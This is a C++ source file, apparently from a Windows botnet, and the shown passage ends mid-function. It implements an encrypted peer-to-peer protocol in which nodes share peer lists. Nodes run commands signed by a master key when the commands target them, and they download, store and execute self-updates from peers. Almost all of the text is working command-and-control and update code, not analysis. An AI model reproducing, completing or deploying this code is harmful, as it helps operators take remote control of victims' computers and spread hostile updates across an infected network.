#include <winsock2.h>
#include "p2p2.h"

R_RSA_PRIVATE_KEY RSAPrivateKey;
R_RSA_PUBLIC_KEY RSAPublicKey;
R_RSA_PUBLIC_KEY RSAPublicKeyMaster;
CHAR TempUnique[16]; // Used to prevent connecting to self
struct {
	UINT Client;
	UINT Control;
	UINT Link;
} ConnectionCount;
struct {
	UINT Success;
	UINT Failure;
} ConnectBackCount;
HostExempts WhiteList;
HostExempts BlackList;
std::vector<DWORD> MIDList;
BOOL ConnectionMode;
PVOID ClientConnected = NULL;
P2P2 *P2P2Instance = NULL;

P2P2::Negotiation::Negotiation(UCHAR ConnectionType){
	RecvBuf.Create(RECVBUF_SIZE);
	Socket.CreateEvent();
	Negotiation::ConnectionType = ConnectionType;
	Position = CLIENT;
	Attached = FALSE;
	ErrorCode = ERR_CONNECTIONCLOSED;
	SentShutdown = FALSE;
}

P2P2::Negotiation::~Negotiation(){
	if(!Attached){
		RecvBuf.Cleanup();
		Socket.Disconnect(CLOSE_BOTH_HDL);
	}
}

VOID P2P2::Negotiation::Connect(PCHAR Host, USHORT Port, UCHAR ConnectionType){
	State = CONNECT;
	Negotiation::ConnectionType = ConnectionType;
	RecvBuf.Reset();
	Socket.StopCrypt();
	Socket.Disconnect(CLOSE_SOCKET_HDL);
	Socket.Create(SOCK_STREAM);
	Socket.EventSelect(FD_CONNECT);
	Socket.Connect(Host, Port);
	ErrorCode = ERR_CONNECTIONCLOSED;
	RSABlock.Length.BytesRead = 0;
	Position = CLIENT;
	SentShutdown = FALSE;
}

VOID P2P2::Negotiation::Disconnect(VOID){
	Socket.Disconnect(CLOSE_SOCKET_HDL);
}

VOID P2P2::Negotiation::Close(UINT ErrorCode){
	Socket.Shutdown();
	Negotiation::ErrorCode = ErrorCode;
	SentShutdown = TRUE;
	Timeout.SetTimeout(SHUTDOWN_TIMEOUT);
	Timeout.Reset();
}

VOID P2P2::Negotiation::Attach(::Socket & Socket, ReceiveBuffer & RecvBuf, BOOL Position){
	Negotiation::Position = Position;
	Negotiation::Socket.Disconnect(CLOSE_BOTH_HDL);
	Negotiation::Socket = Socket;
	Negotiation::Socket.EventSelect(FD_READ | FD_CLOSE);
	Negotiation::RecvBuf.Cleanup();
	Negotiation::RecvBuf = RecvBuf;
	if(Position == HOST){
		State = READ_PUBLIC_KEY_LENGTH;
		Negotiation::RecvBuf.StartRL(sizeof(WORD)); // First word tells us public key length
		Timeout.SetTimeout(NEGOTIATION_TIMEOUT);
		Timeout.Reset();
		RSABlock.Length.BytesRead = 0;
	}
	Attached = TRUE;
}

BOOL P2P2::Negotiation::Process(WSANETWORKEVENTS NetEvents){
	if(NetEvents.lNetworkEvents & FD_CLOSE || SentShutdown && Timeout.TimedOut()){
		#ifdef _DEBUG
		PCHAR Type = "UNKNOWN";
		switch(ConnectionType){
			case TYPE_CONTROL: Type = "CONTROL"; break;
			case TYPE_CLIENT: Type = "CLIENT"; break;
			case TYPE_LINK: Type = "LINK"; break;
		}
		CHAR Host[256];
		Socket.GetPeerName(Host, sizeof(Host));
		dprintf("[Negotiation:%s] Connection closed %s (TYPE_%s[%d]) %X\r\n", Position==CLIENT?"Client":"Host", Host, Type, ErrorCode, SentShutdown);
		#endif
		if(Ready()){
			switch(ConnectionType){
				case TYPE_CLIENT: ConnectionCount.Client--; break;
				case TYPE_CONTROL: ConnectionCount.Control--; break;
				case TYPE_LINK: ConnectionCount.Link--; break;
			}
		}
		Socket.Disconnect(CLOSE_SOCKET_HDL);
		OnFail(ErrorCode);
		return FALSE;
	}else
	if(!Ready() && Timeout.TimedOut() && State != CONNECT && !SentShutdown){
		Close(ERR_TIMEOUT);
	}else
	if(!Ready()){
	if(GetPosition() == CLIENT){
		if(NetEvents.lNetworkEvents & FD_CONNECT){
			if(State == CONNECT){
				if(!NetEvents.iErrorCode[FD_CONNECT_BIT]){
					#ifdef _DEBUG
					#ifdef VERBOSE_NEGOTIATION
					dprintf("[Negotiation:Client] Connected, sending %d-bit public key\r\n", RSAPublicKey.bits);
					#endif
					#endif
					WordToArray(RSAPublicKey.bits, (PBYTE)RSABlock.Length.Data);
					Socket.Send((PCHAR)RSABlock.Length.Data, sizeof(RSABlock.Length.Data));
					Socket.Send((PCHAR)RSAPublicKey.modulus + (MAX_RSA_MODULUS_LEN - ((RSAPublicKey.bits + 7) / 8)), (RSAPublicKey.bits + 7) / 8);
					RSABlock.BytesRead = 0;
					State = READ_SYMMETRICAL_KEY;
					RecvBuf.StartRL((RSAPublicKey.bits + 7) / 8);
					Socket.EventSelect(FD_READ | FD_CLOSE);
					Timeout.SetTimeout(NEGOTIATION_TIMEOUT);
					Timeout.Reset();
				}else{
					#ifdef _DEBUG
					dprintf("[Negotiation:Client] Connection failed %d\r\n", NetEvents.iErrorCode[FD_CONNECT_BIT]);
					#endif
					if(NetEvents.iErrorCode[FD_CONNECT_BIT] == WSAETIMEDOUT)
						OnFail(ERR_CONTIMEDOUT);
					else
						OnFail(ERR_UNREACHABLE);
				}
			}
		}
		if(NetEvents.lNetworkEvents & FD_READ){
			Timeout.Reset();
			if(State == READ_SYMMETRICAL_KEY){
				if(RecvBuf.Read(Socket) > 0){
					BOOL Done = RecvBuf.PopRLBuffer();
					RSABlock.Read(RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
					if(Done){
						#ifdef _DEBUG
						#ifdef VERBOSE_NEGOTIATION
						dprintf("[Negotiation:Client] Read in encrypted symmetrical key\r\n");
						#endif
						#endif

						UINT OutputLen;
						UCHAR Output[MAX_RSA_MODULUS_LEN];
						//R_RSA_PRIVATE_KEY RSAPrivateKey = P2P2Instance->GetPrivateKey();

						int ret = RSAPrivateDecrypt(Output, &OutputLen, (PBYTE)RSABlock.Data, RSABlock.BytesRead, &RSAPrivateKey);

						if(ret != 0){
							#ifdef _DEBUG
							#ifdef VERBOSE_NEGOTIATION
							dprintf("[Negotiation:Client] Error decrypting (%d)\r\n", ret);
							dprintf("%d\r\n", RSABlock.BytesRead);
							for(UINT i = 0; i < RSABlock.BytesRead; i++)
								dprintf("%.2X", (BYTE)RSABlock.Data[i]);
							dprintf("\r\n");
							#endif
							#endif
							Close(ERR_CRYPT);
						}else{
							WORD BlockSize = ArrayToWord((PBYTE)Output);
							if((BlockSize + sizeof(BYTE) + sizeof(WORD)) >= OutputLen){
								#ifdef _DEBUG
								#ifdef VERBOSE_NEGOTIATION
								dprintf("[Negotiation:Client] Information incorrect\r\n");
								#endif
								#endif
								Close(ERR_INCORRECT);
							}else{
								if(BlockSize != BLOCK_SIZE){ // Reason only one block size is accepted is because its optimized at compile
									#ifdef _DEBUG
									#ifdef VERBOSE_NEGOTIATION
									dprintf("[Negotiation:Client] Symmetrical key length not of acceptable length\r\n");
									#endif
									#endif
									Close(ERR_KEYLENGTH);
								}else{
//									UINT NetDegree = Output[sizeof(WORD)];
//									if(NetDegree != P2P2Instance->GetNetDegree()){
//										#ifdef _DEBUG
//										dprintf("[Negotiation:Client] Invalid network degree\r\n");
//										#endif
//										Close(ERR_INVALIDDEGREE);
//								}else{
										PCHAR NetID = new CHAR[(OutputLen - (sizeof(BYTE) + sizeof(WORD) + BlockSize)) + 1];
										memcpy(NetID, Output + (sizeof(BYTE) + sizeof(WORD) + BlockSize), OutputLen - (sizeof(BYTE) + sizeof(WORD) + BlockSize));
										NetID[OutputLen - (sizeof(BYTE) + sizeof(WORD) + BlockSize)] = 0;
										if(strcmp(NetID, NETWORK_ID) != 0){
											delete[] NetID;
											#ifdef _DEBUG
											#ifdef VERBOSE_NEGOTIATION
											dprintf("[Negotiation:Client] Incorrect network\r\n");
											#endif
											#endif
											Close(ERR_NETWORK);
										}else{
											delete[] NetID;
											#ifdef _DEBUG
											#ifdef VERBOSE_NEGOTIATION
											dprintf("[Negotiation:Client] Decrypted successfully, telling of connection type\r\n");
											#endif
											#endif
											PUCHAR Key = Output + (sizeof(BYTE) + sizeof(WORD));
											CFB CFB;
											CFB.SetKey(Key, BLOCK_SIZE);
											Socket.Crypt(CFB);
											State = GET_STATUS;
											Socket.Sendf("%d\r\n", ConnectionType);
										}
//									}
								}
							}
						}
					}					
				}
			}else
			if(State == GET_STATUS){
				if(RecvBuf.Read(Socket) > 0){
					if(RecvBuf.PopItem("\r\n", 2)){
						if(atoi(RecvBuf.PoppedItem) == RPL_CONNECTION_OKAY){
							#ifdef _DEBUG
							dprintf("[Negotiation:Client] Connection ready\r\n");
							#endif
							ErrorCode = ERR_CONNECTIONCLOSED;
							switch(ConnectionType){
								case TYPE_CLIENT: ConnectionCount.Client++; break;
								case TYPE_CONTROL: ConnectionCount.Control++; break;
								case TYPE_LINK: ConnectionCount.Link++; break;
							}
							State = READY;
							OnReady();
						}else{
							#ifdef _DEBUG
							dprintf("[Negotiation:Client] Connection returned error status (%d)\r\n", atoi(RecvBuf.PoppedItem));
							#endif
							Close(atoi(RecvBuf.PoppedItem));
						}
					}
				}
			}
		}
	}else						/////////////////////////////////////////// H O S T ///////////////////////////////////////////
	if(GetPosition() == HOST){
		if(NetEvents.lNetworkEvents & FD_READ){
			Timeout.Reset();
			while(RecvBuf.Read(Socket) > 0){
				if(Socket.IsCrypted()){
					if(State == GET_CONNECTION_TYPE){
						if(RecvBuf.PopItem("\r\n", 2)){
							ConnectionType = atoi(RecvBuf.PoppedItem);
							if(ConnectionType <= TYPE_UNKNOWN || ConnectionType > TYPE_LINK/*(TYPE_LINK + LinksInDegree(P2P2Instance->GetNetDegree()))*/){ // Invalid connection type
								Close(ERR_TYPE);
							}else{
								UINT Max = 0;
								LPUINT Count = NULL;
								switch(ConnectionType){
									case TYPE_CLIENT: Count = &ConnectionCount.Client; Max = MAX_CLIENT_CONNECTIONS; break;
									case TYPE_CONTROL: Count = &ConnectionCount.Control; Max = MAX_CONTROL_CONNECTIONS; break;
									case TYPE_LINK: Count = &ConnectionCount.Link; Max = MAX_LINK_CONNECTIONS; break;
								}
								if(Count){
									if((*Count) >= Max){
										Socket.Sendf("%d\r\n", ERR_CONNECTION_CLASS_FULL);
										Close(ERR_CONNECTION_CLASS_FULL);
									}else{
										#ifdef _DEBUG
										dprintf("[Negotiation:Host] Connection ready\r\n");
										#endif
										(*Count)++;
										ErrorCode = ERR_CONNECTIONCLOSED;
										Socket.Sendf("%d\r\n", RPL_CONNECTION_OKAY);
										State = READY;
										OnReady();
										break;
									}
								}
							}
						}
					}					
				}else{
					if(State == READ_PUBLIC_KEY_LENGTH){
						BOOL Done = RecvBuf.PopRLBuffer();
						RSABlock.Length.Read(RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						if(Done){
							WORD RSABlockBits = ArrayToWord((PBYTE)RSABlock.Length.Data);
							if(RSABlockBits > MAX_RSA_MODULUS_BITS || RSABlockBits < MIN_RSA_MODULUS_BITS){
								#ifdef _DEBUG
								#ifdef VERBOSE_NEGOTIATION
								dprintf("[Negotiation:Host] RSA public key not of acceptable length\r\n");
								#endif
								#endif
								Close(ERR_KEYLENGTH);
							}else{
								RecvBuf.StartRL((RSABlockBits + 7) / 8);
								RSABlock.BytesRead = 0;
								State = READ_PUBLIC_KEY;
							}
						}
					}
					if(State == READ_PUBLIC_KEY){
						BOOL Done = RecvBuf.PopRLBuffer();
						RSABlock.Read(RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						if(Done){
							UCHAR Key[BLOCK_SIZE];
							for(UINT i = 0; i < BLOCK_SIZE; i++)
								Key[i] = (UCHAR)rand_r(0, 0xff);

							
							UINT PublicKeyBits = ArrayToWord((PBYTE)RSABlock.Length.Data);
							#ifdef _DEBUG
							#ifdef VERBOSE_NEGOTIATION
							dprintf("[Negotiation:Host] Read in %d-bit public key\r\n", PublicKeyBits);
							#endif
							#endif
							if((sizeof(WORD) + sizeof(BYTE) + strlen(NETWORK_ID) + sizeof(Key)) > (PublicKeyBits / 8)){
								#ifdef _DEBUG
								#ifdef VERBOSE_NEGOTIATION
								dprintf("[Negotiation:Host] Key not large enough to send information\r\n");
								#endif
								#endif
								Close(ERR_KEYLENGTH);
							}else{
								R_RSA_PUBLIC_KEY PublicKey = RSA::MakePublicKey(PublicKeyBits, (PBYTE)RSABlock.Data);
								R_RANDOM_STRUCT RandomStruct;
								R_RandomInit(&RandomStruct);
								PUCHAR Block = new UCHAR[RandomStruct.bytesNeeded];
								for(UINT i = 0; i < RandomStruct.bytesNeeded; i++)
									Block[i] = (UCHAR)rand_r(0, 0xff);
								R_RandomUpdate(&RandomStruct, Block, RandomStruct.bytesNeeded);
								delete[] Block;

								UCHAR Input[MAX_RSA_MODULUS_LEN];
								UCHAR Output[MAX_RSA_MODULUS_LEN];
								UINT OutputLen;

								WordToArray(BLOCK_SIZE, Input);
								Input[sizeof(WORD)] = 0;//(BYTE)P2P2Instance->GetNetDegree();
								memcpy(Input + (sizeof(WORD) + sizeof(BYTE)), Key, sizeof(Key));
								strcpy(PCHAR(Input + (sizeof(WORD) + sizeof(BYTE) + sizeof(Key))), NETWORK_ID);

								if(RSAPublicEncrypt(Output, &OutputLen, Input, (sizeof(WORD) + sizeof(BYTE) + sizeof(Key) + strlen(NETWORK_ID)), &PublicKey, &RandomStruct) != 0){
									#ifdef _DEBUG
									#ifdef VERBOSE_NEGOTIATION
									dprintf("[Negotiation:Host] Error encrypting information\r\n");
									#endif
									#endif
									Close(ERR_CRYPT);
								}else{
									#ifdef _DEBUG
									#ifdef VERBOSE_NEGOTIATION
									dprintf("[Negotiation:Host] Transmitting encrypted symmetrical key and net info\r\n");
									#endif
									#endif

									Socket.Send((PCHAR)Output, OutputLen);
									CFB CFB;
									CFB.SetKey(Key, BLOCK_SIZE);
									Socket.Crypt(CFB);
									State = GET_CONNECTION_TYPE;
								}
							}
						}
					}
				}
			}
		}
	}
	}else
	ProcessSpecial(NetEvents);
	return TRUE;
}

BOOL P2P2::Negotiation::Ready(VOID){
	return(State == READY);
}

UCHAR P2P2::Negotiation::GetConnectionType(VOID){
	return ConnectionType;
}

BOOL P2P2::Negotiation::TransformConnection(UCHAR ConnectionType){
	UCHAR OldConnectionType = Negotiation::ConnectionType;
	if(ConnectionType == TYPE_CLIENT){
		if(ConnectionCount.Client < MAX_CLIENT_CONNECTIONS){
			ConnectionCount.Client++;
			Negotiation::ConnectionType = ConnectionType;
		}else{
			return FALSE;
		}
	}else
	if(ConnectionType == TYPE_CONTROL){
		if(ConnectionCount.Control < MAX_CONTROL_CONNECTIONS){
			ConnectionCount.Control++;
			Negotiation::ConnectionType = ConnectionType;
		}else{
			return FALSE;
		}
	}else
	if(ConnectionType == TYPE_LINK){
		if(ConnectionCount.Link < MAX_LINK_CONNECTIONS){
			ConnectionCount.Link++;
			Negotiation::ConnectionType = ConnectionType;
		}else{
			return FALSE;
		}
	}else{
		return FALSE;
	}
	switch(OldConnectionType){
		case TYPE_CLIENT: ConnectionCount.Client--; break;
		case TYPE_CONTROL: ConnectionCount.Control--; break;
		case TYPE_LINK: ConnectionCount.Link--; break;
	}
	return TRUE;
}

BOOL P2P2::Negotiation::GetPosition(VOID){
	return Position;
}

BOOL P2P2::Negotiation::Connected(VOID){
	return bConnected;
}

template <class N>
BOOL P2P2::NegotiationQueue<N>::OnEvent(WSANETWORKEVENTS NetEvents){
	return Negotiation[SignalledEvent]->Process(NetEvents);
}

template <class N>
VOID P2P2::NegotiationQueue<N>::OnAdd(VOID){
	N* Negotiation = new N;
	Negotiation->Attach(SocketList.back(), RecvBufList.back(), SocketList.back().GetSelectedEvents() & FD_CONNECT?CLIENT:HOST);
	NegotiationQueue::Negotiation.push_back(Negotiation);
}

template <class N>
VOID P2P2::NegotiationQueue<N>::OnRemove(VOID){
	delete Negotiation[SignalledEvent];
	Negotiation.erase(Negotiation.begin() + SignalledEvent);
}

template <class N>
N* P2P2::NegotiationQueue<N>::GetLastAdded(VOID){
	return Negotiation.back();
}

template <class N>
N* P2P2::NegotiationQueue<N>::GetItem(UINT Index){
	return Negotiation[Index];
}

P2P2::Connection::Connection() : Negotiation(TYPE_UNKNOWN){
	ConnectBackThread = NULL;
	State = SEND_CONNECTBACK;
	PingReplied();
	CurrentMsg.State = CurrentMsg::State::INACTIVE;
	CurrentMsg.Body = NULL;
}

VOID P2P2::Connection::SetLinkCacheLink(LinkCache::Link Link){
	Connection::Link = Link;
}

USHORT P2P2::Connection::GetPort(VOID){
	return Port;
}

VOID P2P2::Connection::ProcessSpecial(WSANETWORKEVENTS NetEvents){
	if(NetEvents.lNetworkEvents & FD_READ){
		PingReplied();
		while(RecvBuf.Read(Socket) > 0){
			RLMode:
			if(RecvBuf.InRLMode()){
				if(CurrentMsg.State != CurrentMsg::State::INACTIVE){ // Reading in a MSG_MESSAGE command
					BOOL Done = RecvBuf.PopRLBuffer();
					if(CurrentMsg.State == CurrentMsg::State::READ_SIGNATURE){
						CurrentMsg.Signature.Read(RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						if(Done){
							CurrentMsg.State = CurrentMsg::State::READ_BODY;
							RecvBuf.StartRL(CurrentMsg.Length);
							goto RLMode;
						}
					}else
					if(CurrentMsg.State == CurrentMsg::State::READ_BODY){
						if(CurrentMsg.BytesRead == 0){
							CurrentMsg.Body = new CHAR[CurrentMsg.Length];
						}
						memcpy(CurrentMsg.Body + CurrentMsg.BytesRead, RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						CurrentMsg.BytesRead += RecvBuf.GetRLBufferSize();
						if(Done){
							#ifdef _DEBUG
							dprintf("** P2P Message transmission received\r\n");
							#endif
							std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), CurrentMsg.MID);
							if(I == MIDList.end()){
								if(CurrentMsg.NewLinkMessage){
									if(CurrentMsg.TTL > MAX_NEWLINK_TTL)
										CurrentMsg.TTL = MAX_NEWLINK_TTL;
									CHAR Hostname[256];
									USHORT Port;
									LinkCache::DecodeName(CurrentMsg.Body, Hostname, sizeof(Hostname), &Port);
									if(!BlackList.Matches(Hostname)){
										#ifdef _DEBUG
										dprintf("** P2P New link %s:%d\r\n", Hostname, Port);
										#endif
										LinkCache::AddLink(CurrentMsg.Body);
										if(GetConnectionType() == TYPE_LINK){
											P2P2Instance->BroadcastMessage(this, CurrentMsg.SendTo, CurrentMsg.TTL, CurrentMsg.Body,
												NULL, CurrentMsg.MID, CurrentMsg.NewLinkMessage);
										}
									}
								}else{
									UCHAR Output[MAX_RSA_MODULUS_LEN];
									UINT OutputLen;
									INT Ret = RSAPublicDecrypt(Output, &OutputLen, (PUCHAR)CurrentMsg.Signature.Data, sizeof(CurrentMsg.Signature.Data), &RSAPublicKeyMaster);
									if(Ret == 0 && OutputLen == 16){
										UCHAR Hash[16];
										MD5 MD5;
										MD5.Update((PUCHAR)CurrentMsg.Body, CurrentMsg.Length);
										CHAR Temp[32];
										sprintf(Temp, "%X", CurrentMsg.MID);
										MD5.Update((PUCHAR)Temp, strlen(Temp));
										MD5.Update((PUCHAR)CurrentMsg.SendTo, strlen(CurrentMsg.SendTo));
										MD5.Finalize(Hash);

										if(memcmp(Hash, Output, 16) == 0){
											#ifdef _DEBUG
											dprintf("** P2P Message is authentic %s\r\n", CurrentMsg.Body);
											#endif
											if(GetConnectionType() == TYPE_LINK || (GetConnectionType() == TYPE_CONTROL && CurrentMsg.RunLocally)){
												if(strcmp(CurrentMsg.SendTo, "2") == 0 || strcmp(CurrentMsg.SendTo, "3") == 0 || WildcardCompare(CurrentMsg.SendTo, Config::GetUUIDAscii()))
													P2P2Instance->ExecuteMessage(CurrentMsg.Body);
											}else
											if(GetConnectionType() == TYPE_CLIENT){
												if(strcmp(CurrentMsg.SendTo, "1") == 0 || strcmp(CurrentMsg.SendTo, "3") == 0 || WildcardCompare(CurrentMsg.SendTo, Config::GetUUIDAscii()))
													P2P2Instance->ExecuteMessage(CurrentMsg.Body);
											}
											if(GetConnectionType() == TYPE_LINK || GetConnectionType() == TYPE_CONTROL){
												P2P2Instance->BroadcastMessage(this, CurrentMsg.SendTo, CurrentMsg.TTL, CurrentMsg.Body,
													CurrentMsg.Signature.Data, CurrentMsg.MID, NULL);
											}
										}
									}
								}
								MIDList.push_back(CurrentMsg.MID);
								if(MIDList.size() > MAX_MIDS_STORE){
									MIDList.erase(MIDList.begin(), ++MIDList.begin());
								}
							}
							goto RLMode;
						}
					}
				}else{ // Updating
					if(Update.Read < Update.Size){
						RecvBuf.PopRLBuffer();
						Update.MD5.Update((PUCHAR)RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						memcpy(Update.Buffer + Update.Read, RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						Update.Read += RecvBuf.GetRLBufferSize();
						if(Update.Read == Update.Size){
							RecvBuf.StartRL(RSAPublicKeyMasterLen);
							Update.Signature.BytesRead = 0;
						}
					}
					if(Update.Read >= Update.Size){
						RecvBuf.PopRLBuffer();
						Update.Signature.Read(RecvBuf.PoppedItem, RecvBuf.GetRLBufferSize());
						if(Update.Signature.BytesRead == RSAPublicKeyMasterLen){
							UCHAR Output[MAX_RSA_MODULUS_LEN];
							UINT OutputLen;
							INT Ret = RSAPublicDecrypt(Output, &OutputLen, (PUCHAR)Update.Signature.Data, sizeof(Update.Signature.Data), &RSAPublicKeyMaster);
							if(Ret == 0 && OutputLen == 16){
								UCHAR Hash[16];
								Update.MD5.Finalize(Hash);
								if(memcmp(Output, Hash, 16) == 0){
									#ifdef _DEBUG
									dprintf("** P2P Update is authentic, running update\r\n");
									#endif
									cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
									Reg.SetBinary(REG_UPDATE_HASH_VALUE, (PCHAR)Hash, sizeof(Hash));
									Reg.SetBinary(REG_UPDATE_SIGNATURE_VALUE, Update.Signature.Data, sizeof(Update.Signature.Data));
									CHAR FileName[MAX_PATH];
									CHAR TempPath[MAX_PATH];
									GetTempPath(sizeof(TempPath), TempPath);
									GetTempFileName(TempPath, NULL, NULL, FileName);
									File File(FileName);
									File.Write((PBYTE)Update.Buffer, Update.Size);
									File.Close();
									::Update(FileName);
								}
							}
						}
					}
				}
			}else{
				while(RecvBuf.PopItem("\r\n", 2)){
					PCHAR Item[7];
					UINT Ordinal = TokenizeStr(RecvBuf.PoppedItem, Item, 7, "|");
					if(Ordinal == CMD_PING){
						#ifdef _DEBUG
						dprintf("** P2P CMD_PING received\r\n");
						#endif
						Socket.Sendf("%d\r\n", RPL_PING);
					}else
					if(Ordinal == RPL_PING){
						#ifdef _DEBUG
						dprintf("** P2P RPL_PING received\r\n");
						#endif
						PingReplied();
					}else
					if(Ordinal == RPL_LINKITEM && GetPosition() == CLIENT){
						if(State == GET_LINK_LIST){
							if(Item[1]){
								if(strcmp(Item[1], "END") == 0){
									Socket.Sendf("%d\r\n", CMD_GETVERSION);
								}else{
									/*//temporary
									CHAR Hostname2[256];
									USHORT Port2;
									LinkCache::DecodeName(Item[1], Hostname2, sizeof(Hostname2), &Port2);
									if(Port2 != 8)
									//*/
									LinkCache::AddLink(Item[1]);
								}
							}
						}
					}else
					if(Ordinal == CMD_LISTLINKS && GetPosition() == HOST){
						#ifdef _DEBUG
						dprintf("** P2P CMD_LISTLINKS received\r\n");
						#endif
						UINT Index = 0;
						for(UINT i = 0; i < (LinkCache::GetLinkCount() > MAX_LINKS ? MAX_LINKS : LinkCache::GetLinkCount()); i++){
							LinkCache::Link Link = LinkCache::GetNextLink(&Index);
							CHAR EncodedName[256];
							LinkCache::EncodeName(EncodedName, sizeof(EncodedName), Link.Hostname, Link.Port);
							Socket.Sendf("%d|%s\r\n", RPL_LINKITEM, EncodedName);
						}
						Socket.Sendf("%d|END\r\n", RPL_LINKITEM);
					}else
					if(Ordinal == CMD_GETVERSION){
						if(GetConnectionType() == TYPE_CLIENT && ConnectionCount.Client > MAX_CLIENT_CONNECTIONS_BEFORE_DISCONNECT){
							#ifdef _DEBUG
							dprintf("** P2P Too many clients connected, disconnecting\r\n");
							#endif
							Socket.Shutdown();
						}else
						if(GetConnectionType() == TYPE_LINK && ConnectionCount.Link > MAX_LINK_CONNECTIONS_BEFORE_DISCONNECT){
							#ifdef _DEBUG
							dprintf("** P2P Too many links connected, disconnecting\r\n");
							#endif
							Socket.Shutdown();
						}else{
							Socket.Sendf("%d|%d\r\n", RPL_GETVERSION, atoi(EXE_VERSION));
						}
					}else
					if(Ordinal == RPL_GETVERSION){
						#ifdef _DEBUG
						dprintf("** P2P Received RPL_GETVERSION\r\n");
						#endif
						if(Item[1]){
							if(atoi(Item[1]) > atoi(EXE_VERSION)){
								Socket.Sendf("%d\r\n", CMD_REQUEST_UPGRADE);
								State = REQUESTING_UPGRADE;
								#ifdef _DEBUG
								dprintf("** P2P Requesting upgrade to %d\r\n", atoi(Item[1]));
								#endif
							}else
							if(atoi(Item[1]) < atoi(EXE_VERSION)){
								#ifdef _DEBUG
								dprintf("** P2P Peer not up to date\r\n");
								#endif
								Socket.Sendf("%d|%d\r\n", RPL_GETVERSION, atoi(EXE_VERSION));
							}else{
								#ifdef _DEBUG
								dprintf("** P2P Up to date\r\n");
								#endif
							}
						}
					}else
					if(Ordinal == CMD_REQUEST_UPGRADE){
						#ifdef _DEBUG
						dprintf("** P2P Upgrade request received\r\n");
						#endif
						cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
						MD5 MD5;
						File File;
						File.Open(Config::GetExecuteFilename(), GENERIC_READ, FILE_SHARE_READ, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL);
						CHAR Buffer[1024];
						DWORD TotalBytesRead = 0;
						while(TotalBytesRead < File.GetSize()){
							DWORD BytesRead;
							File.Read((PBYTE)Buffer, sizeof(Buffer), &BytesRead);
							MD5.Update((PUCHAR)Buffer, BytesRead);
							TotalBytesRead += BytesRead;
						}
						UCHAR Hash1[16];
						UCHAR Hash2[16];
						MD5.Finalize(Hash1);
						DWORD Size = sizeof(Hash2);
						Reg.GetBinary(REG_UPDATE_HASH_VALUE, (PCHAR)Hash2, &Size);
						if(Reg.Exists(REG_UPDATE_SIGNATURE_VALUE) && memcmp(Hash1, Hash2, sizeof(Hash1)) == 0){
							#ifdef _DEBUG
							dprintf("** P2P Upgrade now transmitting\r\n");
							#endif
							File.SetPointer(FILE_BEGIN, 0);
							Socket.Sendf("%d|%d\r\n", RPL_UPGRADE_INFORMATION, File.GetSize());
							DWORD TotalBytesRead = 0;
							while(TotalBytesRead < File.GetSize()){
								DWORD BytesRead;
								File.Read((PBYTE)Buffer, sizeof(Buffer), &BytesRead);
								Socket.Send(Buffer, BytesRead);
								TotalBytesRead += BytesRead;
							}
							CHAR Signature[RSAPublicKeyMasterLen];
							DWORD Size = sizeof(Signature);
							Reg.GetBinary(REG_UPDATE_SIGNATURE_VALUE, Signature, &Size);
							Socket.Send(Signature, sizeof(Signature));
						}else{
							#ifdef _DEBUG
							dprintf("** P2P Upgrade unavailable\r\n");
							#endif
							Socket.Sendf("%d\r\n", RPL_UPGRADE_UNAVAILABLE);
						}
					}else
					if(Ordinal == RPL_UPGRADE_UNAVAILABLE){
						#ifdef _DEBUG
						dprintf("** P2P Upgrade unavailable\r\n");
						#endif
					}else
					if(Ordinal == RPL_UPGRADE_INFORMATION){
						if(State == REQUESTING_UPGRADE && Item[1]){
							State = UPGRADE;
							#ifdef _DEBUG
							dprintf("** P2P Downloading upgrade (%d bytes)\r\n", atoi(Item[1]));
							#endif
							Update.Size = atoi(Item[1]);
							Update.Buffer = new CHAR[Update.Size];
							Update.Read = 0;
							RecvBuf.StartRL(atoi(Item[1]));
							goto RLMode;
						}
					}else
					if(Ordinal == MSG_MESSAGE){
						#ifdef _DEBUG
						dprintf("** P2P MSG_MESSAGE received\r\n");
						#endif
						if(Item[6]){
							CurrentMsg.MID = strtoul(Item[1], NULL, 16);
							CurrentMsg.Length = atoi(Item[2]);
							CurrentMsg.BytesRead = 0;
							strncpy(CurrentMsg.SendTo, Item[3], sizeof(CurrentMsg.SendTo));
							CurrentMsg.TTL = atoi(Item[4]);
							CurrentMsg.RunLocally = (atoi(Item[5]) != 0 ? TRUE : FALSE);
							CurrentMsg.NewLinkMessage = (atoi(Item[6]) != 0 ? TRUE : FALSE);
							if(CurrentMsg.NewLinkMessage){
								CurrentMsg.State = CurrentMsg::State::READ_BODY;
								RecvBuf.StartRL(CurrentMsg.Length);
								goto RLMode;
							}else{
								CurrentMsg.State = CurrentMsg::State::READ_SIGNATURE;
								CurrentMsg.Signature.BytesRead = 0;
								RecvBuf.StartRL(RSAPublicKeyMasterLen);
								goto RLMode;
							}
						}
					}
					if(GetConnectionType() == TYPE_CONTROL){
						if(GetPosition() == HOST){
							if(Ordinal == CMD_CONNECTBACK){
								if(State == WAIT_FOR_CONNECTBACK){
									#ifdef _DEBUG
									dprintf("** P2P CMD_CONNECTBACK received ");
									#endif
									if(!ConnectBackThread && Item[1]){
										Port = atoi(Item[1]);
										ConnectBackThread = new P2P2::ConnectBackThread(this, Port); // Deadlock problem isolated here InterlockExchangePointer used instead of mutex much better but must test more
										#ifdef _DEBUG
										dprintf("started ConnectBackThread\r\n");
										#endif
									}else{
										#ifdef _DEBUG
										dprintf("ConnectBackThread already exists\r\n");
										#endif
									}
								}
							}else
							if(Ordinal == CMD_TRANSFORM){
								if(Item[2]){
									#ifdef _DEBUG
									dprintf("** P2P received CMD_TRANSFORM, ");
									#endif
									UINT Type = atoi(Item[1]);

									if(strcmp(Item[2], TempUnique) == 0){
										#ifdef _DEBUG
										dprintf("connected to self, disconnecting\r\n");
										#endif
										Close(ERR_CONNECTIONCLOSED);
									}else{
										BOOL AlreadyConnected = FALSE;
										UINT il = P2P2Instance->ConnectionList.GetSize();
										for(UINT i = 0; i < il; i++){
											P2P2Instance->ConnectionList.GetItem(i)->Mutex.WaitForAccess();
